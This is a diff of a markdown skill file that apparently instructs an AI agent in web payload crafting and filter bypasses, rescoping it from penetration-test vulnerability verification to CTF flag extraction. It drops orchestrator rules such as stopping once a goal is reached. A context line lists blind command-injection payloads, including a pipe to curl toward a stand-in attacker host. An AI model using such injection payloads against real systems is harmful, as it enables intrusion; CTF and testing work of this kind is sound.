@@ -1,13 +1,13 @@
 ---
 name: payload-research
-description: Payload crafting and bypass research for vulnerability verification
-tags: [pentest, payload, research]
+description: Payload crafting and bypass research for CTF challenge verification
+tags: [ctf, payload, research]
 ---
 
 # Payload Research Skill
 
 ## When to Use
-Use this skill when you need to research, craft, or refine payloads for vulnerability verification.
+Use this skill when a CTF Web challenge needs focused payload research, filter bypasses, or a smaller probe set for one suspected vulnerability class.
 
 ## Focus Areas
 - Input point analysis: where does user input enter the application?
@@ -38,9 +38,7 @@ Use this skill when you need to research, craft, or refine payloads for vulnerab
 - Blind: `; sleep 5`, `| curl attacker.com`
 
 ## Output Standards
-- Submit canonical machine output through `submit_sub_agent_output` exactly once.
-- Keep `candidate_findings.status` as `candidate` (no final vulnerability verdicts here).
-- If a `hypothesis_id` is provided, all submitted hypotheses/findings must remain on that single hypothesis.
-- If orchestrator state already marks `goal_achieved=true`, default action is stop and hand off to document/report unless deep-dive is explicitly requested.
 - Provide ready-to-use payloads with prerequisites and expected success/failure signals.
-- Optional markdown explanation is allowed, but machine ingestion only reads the submitted JSON payload.
+- Keep probes minimal and tied to the current challenge evidence.
+- Prefer payloads that can lead directly to flag extraction over broad vulnerability cataloging.
+- Record the final working payload, encoding steps, and reproduction command in the solver notes or exploit script.
